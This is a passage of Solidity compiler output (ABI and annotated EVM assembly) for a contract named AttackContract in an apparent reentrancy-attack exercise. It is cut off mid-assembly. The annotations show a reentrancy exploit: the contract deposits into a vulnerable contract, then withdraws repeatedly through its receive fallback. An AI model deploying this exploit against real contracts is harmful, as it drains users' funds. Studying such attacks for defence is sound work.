{
	"contract/ReentrancyAttacks/AttackContract.sol": {
		"AttackContract": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_vulnerableContractAddress",
							"type": "address"
						},
						{
							"internalType": "address payable",
							"name": "AccountAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "message",
							"type": "string"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "LogMessage",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "vulnerableContract",
					"outputs": [
						{
							"internalType": "contract VulnerableContract",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contract/ReentrancyAttacks/AttackContract.sol\":93:1260  contract AttackContract {... */\n  mstore(0x40, 0x80)\n    /* \"contract/ReentrancyAttacks/AttackContract.sol\":264:484  constructor(... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contract/ReentrancyAttacks/AttackContract.sol\":416:442  _vulnerableContractAddress */\n  dup2\n    /* \"contract/ReentrancyAttacks/AttackContract.sol\":376:394  vulnerableContract */\n  0x00\n  0x00\n    /* \"contract/ReentrancyAttacks/AttackContract.sol\":376:443  vulnerableContract = VulnerableContract(_vulnerableContractAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/ReentrancyAttacks/AttackContract.sol\":463:477  AccountAddress */\n  dup1\n    /* \"contract/ReentrancyAttacks/AttackContract.sol\":453:460  account */\n  0x01\n  0x00\n    /* \"contract/ReentrancyAttacks/AttackContract.sol\":453:477  account = AccountAddress */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/ReentrancyAttacks/AttackContract.sol\":264:484  constructor(... */\n  pop\n  pop\n    /* \"contract/ReentrancyAttacks/AttackContract.sol\":93:1260  contract AttackContract {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_23\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_25\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_26\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_26:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_28\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:949   */\ntag_14:\n    /* \"#utility.yul\":890:897   */\n  0x00\n    /* \"#utility.yul\":919:943   */\n  tag_30\n    /* \"#utility.yul\":937:942   */\n  dup3\n    /* \"#utility.yul\":919:943   */\n  tag_10\n  jump\t// in\ntag_30:\n    /* \"#utility.yul\":908:943   */\n  swap1\n  pop\n    /* \"#utility.yul\":845:949   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":955:1093   */\ntag_15:\n    /* \"#utility.yul\":1036:1068   */\n  tag_32\n    /* \"#utility.yul\":1062:1067   */\n  dup2\n    /* \"#utility.yul\":1036:1068   */\n  tag_14\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1029:1034   */\n  dup2\n    /* \"#utility.yul\":1026:1069   */\n  eq\n    /* \"#utility.yul\":1016:1087   */\n  tag_33\n  jumpi\n    /* \"#utility.yul\":1083:1084   */\n  0x00\n    /* \"#utility.yul\":1080:1081   */\n  0x00\n    /* \"#utility.yul\":1073:1085   */\n  revert\n    /* \"#utility.yul\":1016:1087   */\ntag_33:\n    /* \"#utility.yul\":955:1093   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1099:1258   */\ntag_16:\n    /* \"#utility.yul\":1164:1169   */\n  0x00\n    /* \"#utility.yul\":1195:1201   */\n  dup2\n    /* \"#utility.yul\":1189:1202   */\n  mload\n    /* \"#utility.yul\":1180:1202   */\n  swap1\n  pop\n    /* \"#utility.yul\":1211:1252   */\n  tag_35\n    /* \"#utility.yul\":1246:1251   */\n  dup2\n    /* \"#utility.yul\":1211:1252   */\n  tag_15\n  jump\t// in\ntag_35:\n    /* \"#utility.yul\":1099:1258   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1264:1787   */\ntag_3:\n    /* \"#utility.yul\":1351:1357   */\n  0x00\n    /* \"#utility.yul\":1359:1365   */\n  0x00\n    /* \"#utility.yul\":1408:1410   */\n  0x40\n    /* \"#utility.yul\":1396:1405   */\n  dup4\n    /* \"#utility.yul\":1387:1394   */\n  dup6\n    /* \"#utility.yul\":1383:1406   */\n  sub\n    /* \"#utility.yul\":1379:1411   */\n  slt\n    /* \"#utility.yul\":1376:1495   */\n  iszero\n  tag_37\n  jumpi\n    /* \"#utility.yul\":1414:1493   */\n  tag_38\n  tag_8\n  jump\t// in\ntag_38:\n    /* \"#utility.yul\":1376:1495   */\ntag_37:\n    /* \"#utility.yul\":1534:1535   */\n  0x00\n    /* \"#utility.yul\":1559:1623   */\n  tag_39\n    /* \"#utility.yul\":1615:1622   */\n  dup6\n    /* \"#utility.yul\":1606:1612   */\n  dup3\n    /* \"#utility.yul\":1595:1604   */\n  dup7\n    /* \"#utility.yul\":1591:1613   */\n  add\n    /* \"#utility.yul\":1559:1623   */\n  tag_13\n  jump\t// in\ntag_39:\n    /* \"#utility.yul\":1549:1623   */\n  swap3\n  pop\n    /* \"#utility.yul\":1505:1633   */\n  pop\n    /* \"#utility.yul\":1672:1674   */\n  0x20\n    /* \"#utility.yul\":1698:1770   */\n  tag_40\n    /* \"#utility.yul\":1762:1769   */\n  dup6\n    /* \"#utility.yul\":1753:1759   */\n  dup3\n    /* \"#utility.yul\":1742:1751   */\n  dup7\n    /* \"#utility.yul\":1738:1760   */\n  add\n    /* \"#utility.yul\":1698:1770   */\n  tag_16\n  jump\t// in\ntag_40:\n    /* \"#utility.yul\":1688:1770   */\n  swap2\n  pop\n    /* \"#utility.yul\":1643:1780   */\n  pop\n    /* \"#utility.yul\":1264:1787   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"contract/ReentrancyAttacks/AttackContract.sol\":93:1260  contract AttackContract {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":93:1260  contract AttackContract {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x12065fe0\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x144166ae\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":951:975  LogMessage(\"Entered\", 0) */\n      0x69a6cf7852823a03f1e0278fa944045502fae9fb546695dbf1f50521651a8b73\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":973:974  0 */\n      0x00\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":951:975  LogMessage(\"Entered\", 0) */\n      mload(0x40)\n      tag_8\n      swap2\n      swap1\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1005:1023  600000000000000000 */\n      0x0853a0d2313c0000\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":989:1001  getBalance() */\n      tag_10\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":989:999  getBalance */\n      tag_11\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":989:1001  getBalance() */\n      jump\t// in\n    tag_10:\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":989:1023  getBalance() >= 600000000000000000 */\n      lt\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":985:1097  if (getBalance() >= 600000000000000000) {... */\n      tag_12\n      jumpi\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1039:1057  vulnerableContract */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1039:1066  vulnerableContract.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1067:1085  600000000000000000 */\n      0x0853a0d2313c0000\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1039:1086  vulnerableContract.withdraw(600000000000000000) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      revert(0x00, 0x00)\n    tag_15:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_17\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_17:\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":985:1097  if (getBalance() >= 600000000000000000) {... */\n    tag_12:\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":93:1260  contract AttackContract {... */\n      stop\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1141:1258  function getBalance() public view returns (uint256) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_18\n      jumpi\n      revert(0x00, 0x00)\n    tag_18:\n      pop\n      tag_19\n      tag_11\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      tag_20\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":176:220  VulnerableContract public vulnerableContract */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_22\n      jumpi\n      revert(0x00, 0x00)\n    tag_22:\n      pop\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      tag_25\n      swap2\n      swap1\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":537:862  function attack() public payable {... */\n    tag_5:\n      tag_27\n      tag_28\n      jump\t// in\n    tag_27:\n      stop\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1141:1258  function getBalance() public view returns (uint256) {... */\n    tag_11:\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1184:1191  uint256 */\n      0x00\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1210:1228  vulnerableContract */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1210:1239  vulnerableContract.getBalance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xf8b2cb4f\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1240:1250  msg.sender */\n      caller\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1210:1251  vulnerableContract.getBalance(msg.sender) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_30\n      swap2\n      swap1\n      tag_31\n      jump\t// in\n    tag_30:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_33\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_33:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_34\n      swap2\n      swap1\n      tag_35\n      jump\t// in\n    tag_34:\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1203:1251  return vulnerableContract.getBalance(msg.sender) */\n      swap1\n      pop\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":1141:1258  function getBalance() public view returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":176:220  VulnerableContract public vulnerableContract */\n    tag_24:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":537:862  function attack() public payable {... */\n    tag_28:\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":617:635  600000000000000000 */\n      0x0853a0d2313c0000\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":601:613  getBalance() */\n      tag_37\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":601:611  getBalance */\n      tag_11\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":601:613  getBalance() */\n      jump\t// in\n    tag_37:\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":601:635  getBalance() >= 600000000000000000 */\n      lt\n      iszero\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":580:686  require(... */\n      tag_38\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_39\n      swap1\n      tag_40\n      jump\t// in\n    tag_39:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_38:\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":720:738  vulnerableContract */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":720:746  vulnerableContract.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xb6b55f25\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":747:766  2000000000000000000 */\n      0x1bc16d674ec80000\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":720:767  vulnerableContract.deposit(2000000000000000000) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_41\n      swap2\n      swap1\n      tag_42\n      jump\t// in\n    tag_41:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_43\n      jumpi\n      revert(0x00, 0x00)\n    tag_43:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_45\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_45:\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":807:825  vulnerableContract */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":807:834  vulnerableContract.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":835:854  2000000000000000000 */\n      0x1bc16d674ec80000\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":807:855  vulnerableContract.withdraw(2000000000000000000) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_46\n      swap2\n      swap1\n      tag_42\n      jump\t// in\n    tag_46:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_47\n      jumpi\n      revert(0x00, 0x00)\n    tag_47:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_49\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_49:\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/ReentrancyAttacks/AttackContract.sol\":537:862  function attack() public payable {... */\n      jump\t// out\n        /* \"#utility.yul\":7:176   */\n    tag_50:\n        /* \"#utility.yul\":91:102   */\n      0x00\n        /* \"#utility.yul\":125:131   */\n      dup3\n        /* \"#utility.yul\":120:123   */\n      dup3\n        /* \"#utility.yul\":113:132   */\n      mstore\n        /* \"#utility.yul\":165:169   */\n      0x20\n        /* \"#utility.yul\":160:163   */\n      dup3\n        /* \"#utility.yul\":156:170   */\n      add\n        /* \"#utility.yul\":141:170   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:176   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":182:339   */\n    tag_51:\n        /* \"#utility.yul\":322:331   */\n      0x456e746572656400000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":318:319   */\n      0x00\n        /* \"#utility.yul\":310:316   */\n      dup3\n        /* \"#utility.yul\":306:320   */\n      add\n        /* \"#utility.yul\":299:332   */\n      mstore\n        /* \"#utility.yul\":182:339   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":345:710   */\n    tag_52:\n        /* \"#utility.yul\":487:490   */\n      0x00\n        /* \"#utility.yul\":508:574   */\n      tag_83\n        /* \"#utility.yul\":572:573   */\n      0x07\n        /* \"#utility.yul\":567:570   */\n      dup4\n        /* \"#utility.yul\":508:574   */\n      tag_50\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":501:574   */\n      swap2\n      pop\n        /* \"#utility.yul\":583:676   */\n      tag_84\n        /* \"#utility.yul\":672:675   */\n      dup3\n        /* \"#utility.yul\":583:676   */\n      tag_51\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":701:703   */\n      0x20\n        /* \"#utility.yul\":696:699   */\n      dup3\n        /* \"#utility.yul\":692:704   */\n      add\n        /* \"#utility.yul\":685:704   */\n      swap1\n      pop\n        /* \"#utility.yul\":345:710   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":716:801   */\n    tag_53:\n        /* \"#utility.yul\":761:768   */\n      0x00\n        /* \"#utility.yul\":790:795   */\n      dup2\n        /* \"#utility.yul\":779:795   */\n      swap1\n      pop\n        /* \"#utility.yul\":716:801   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":807:884   */\n    tag_54:\n        /* \"#utility.yul\":844:851   */\n      0x00\n        /* \"#utility.yul\":873:878   */\n      dup2\n        /* \"#utility.yul\":862:878   */\n      swap1\n      pop\n        /* \"#utility.yul\":807:884   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":890:950   */\n    tag_55:\n        /* \"#utility.yul\":918:921   */\n      0x00\n        /* \"#utility.yul\":939:944   */\n      dup2\n        /* \"#utility.yul\":932:944   */\n      swap1\n      pop\n        /* \"#utility.yul\":890:950   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":956:1114   */\n    tag_56:\n        /* \"#utility.yul\":1014:1023   */\n      0x00\n        /* \"#utility.yul\":1047:1108   */\n      tag_89\n        /* \"#utility.yul\":1065:1107   */\n      tag_90\n        /* \"#utility.yul\":1074:1106   */\n      tag_91\n        /* \"#utility.yul\":1100:1105   */\n      dup5\n        /* \"#utility.yul\":1074:1106   */\n      tag_53\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":1065:1107   */\n      tag_55\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":1047:1108   */\n      tag_54\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":1034:1108   */\n      swap1\n      pop\n        /* \"#utility.yul\":956:1114   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1120:1267   */\n    tag_57:\n        /* \"#utility.yul\":1215:1260   */\n      tag_93\n        /* \"#utility.yul\":1254:1259   */\n      dup2\n        /* \"#utility.yul\":1215:1260   */\n      tag_56\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":1210:1213   */\n      dup3\n        /* \"#utility.yul\":1203:1261   */\n      mstore\n        /* \"#utility.yul\":1120:1267   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1273:1818   */\n    tag_9:\n        /* \"#utility.yul\":1475:1479   */\n      0x00\n        /* \"#utility.yul\":1513:1515   */\n      0x40\n        /* \"#utility.yul\":1502:1511   */\n      dup3\n        /* \"#utility.yul\":1498:1516   */\n      add\n        /* \"#utility.yul\":1490:1516   */\n      swap1\n      pop\n        /* \"#utility.yul\":1562:1571   */\n      dup2\n        /* \"#utility.yul\":1556:1560   */\n      dup2\n        /* \"#utility.yul\":1552:1572   */\n      sub\n        /* \"#utility.yul\":1548:1549   */\n      0x00\n        /* \"#utility.yul\":1537:1546   */\n      dup4\n        /* \"#utility.yul\":1533:1550   */\n      add\n        /* \"#utility.yul\":1526:1573   */\n      mstore\n        /* \"#utility.yul\":1590:1721   */\n      tag_95\n        /* \"#utility.yul\":1716:1720   */\n      dup2\n        /* \"#utility.yul\":1590:1721   */\n      tag_52\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":1582:1721   */\n      swap1\n      pop\n        /* \"#utility.yul\":1731:1811   */\n      tag_96\n        /* \"#utility.yul\":1807:1809   */\n      0x20\n        /* \"#utility.yul\":1796:1805   */\n      dup4\n        /* \"#utility.yul\":1792:1810   */\n      add\n        /* \"#utility.yul\":1783:1789   */\n      dup5\n        /* \"#utility.yul\":1731:1811   */\n      tag_57\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":1273:1818   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1824:1926   */\n    tag_58:\n        /* \"#utility.yul\":1886:1893   */\n      0x00\n        /* \"#utility.yul\":1915:1920   */\n      dup2\n        /* \"#utility.yul\":1904:1920   */\n      swap1\n      pop\n        /* \"#utility.yul\":1824:1926   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1932:2124   */\n    tag_59:\n        /* \"#utility.yul\":2007:2016   */\n      0x00\n        /* \"#utility.yul\":2040:2118   */\n      tag_99\n        /* \"#utility.yul\":2058:2117   */\n      tag_100\n        /* \"#utility.yul\":2067:2116   */\n      tag_101\n        /* \"#utility.yul\":2110:2115   */\n      dup5\n        /* \"#utility.yul\":2067:2116   */\n      tag_58\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":2058:2117   */\n      tag_55\n      jump\t// in\n    tag_100:\n        /* \"#utility.yul\":2040:2118   */\n      tag_54\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":2027:2118   */\n      swap1\n      pop\n        /* \"#utility.yul\":1932:2124   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2130:2311   */\n    tag_60:\n        /* \"#utility.yul\":2242:2304   */\n      tag_103\n        /* \"#utility.yul\":2298:2303   */\n      dup2\n        /* \"#utility.yul\":2242:2304   */\n      tag_59\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":2237:2240   */\n      dup3\n        /* \"#utility.yul\":2230:2305   */\n      mstore\n        /* \"#utility.yul\":2130:2311   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2317:2589   */\n    tag_14:\n        /* \"#utility.yul\":2435:2439   */\n      0x00\n        /* \"#utility.yul\":2473:2475   */\n      0x20\n        /* \"#utility.yul\":2462:2471   */\n      dup3\n        /* \"#utility.yul\":2458:2476   */\n      add\n        /* \"#utility.yul\":2450:2476   */\n      swap1\n      pop\n        /* \"#utility.yul\":2486:2582   */\n      tag_105\n        /* \"#utility.yul\":2579:2580   */\n      0x00\n        /* \"#utility.yul\":2568:2577   */\n      dup4\n        /* \"#utility.yul\":2564:2581   */\n      add\n        /* \"#utility.yul\":2555:2561   */\n      dup5\n        /* \"#utility.yul\":2486:2582   */\n      tag_60\n      jump\t// in\n    tag_105:\n        /* \"#utility.yul\":2317:2589   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2595:2713   */\n    tag_61:\n        /* \"#utility.yul\":2682:2706   */\n      tag_107\n        /* \"#utility.yul\":2700:2705   */\n      dup2\n        /* \"#utility.yul\":2682:2706   */\n      tag_54\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":2677:2680   */\n      dup3\n        /* \"#utility.yul\":2670:2707   */\n      mstore\n        /* \"#utility.yul\":2595:2713   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2719:2941   */\n    tag_21:\n        /* \"#utility.yul\":2812:2816   */\n      0x00\n        /* \"#utility.yul\":2850:2852   */\n      0x20\n        /* \"#utility.yul\":2839:2848   */\n      dup3\n        /* \"#utility.yul\":2835:2853   */\n      add\n        /* \"#utility.yul\":2827:2853   */\n      swap1\n      pop\n        /* \"#utility.yul\":2863:2934   */\n      tag_109\n        /* \"#utility.yul\":2931:2932   */\n      0x00\n        /* \"#utility.yul\":2920:2929   */\n      dup4\n        /* \"#utility.yul\":2916:2933   */\n      add\n        /* \"#utility.yul\":2907:2913   */\n      dup5\n        /* \"#utility.yul\":2863:2934   */\n      tag_61\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":2719:2941   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2947:3073   */\n    tag_62:\n        /* \"#utility.yul\":2984:2991   */\n      0x00\n        /* \"#utility.yul\":3024:3066   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":3017:3022   */\n      dup3\n        /* \"#utility.yul\":3013:3067   */\n      and\n        /* \"#utility.yul\":3002:3067   */\n      swap1\n      pop\n        /* \"#utility.yul\":2947:3073   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3079:3221   */\n    tag_63:\n        /* 